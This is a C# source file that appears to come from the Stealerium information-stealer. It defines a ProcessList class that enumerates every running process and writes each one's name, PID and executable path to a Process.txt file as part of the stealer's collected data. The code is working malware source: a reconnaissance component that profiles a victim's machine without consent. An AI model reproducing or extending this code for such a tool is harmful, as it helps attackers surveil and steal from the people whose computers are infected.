using Stealerium.Helpers;
using System;
using System.Diagnostics;
using System.IO;
using System.Management;

namespace Stealerium.Target.System
{
    internal sealed class ProcessList
    {
        // Save process list
        public static void WriteProcesses(string sSavePath)
        {
            Logging.Log("Process List >>");
            foreach (var process in Process.GetProcesses())
            {
                try
                {
                    File.AppendAllText(
                        sSavePath + "\\Process.txt",
                        //$"{DateTime.Now.ToString("yyyy/MM/dd hh:mm:ss")} >> " + 
                        $"NAME: {process.ProcessName } \n" +
                        $"\tPID: {process.Id} \n" +
                        $"\tEXE: {ProcessExecutablePath(process)}\n\n"
                    );
                }
                catch { continue; }
            }
            Logging.Log("Process List Ended >>");
        }

        // Get process executable path
        public static string ProcessExecutablePath(Process process)
        {
            try
            {
                if (process.MainModule != null) return process.MainModule.FileName;
            }
            catch { }
            return "";
        }
    }
}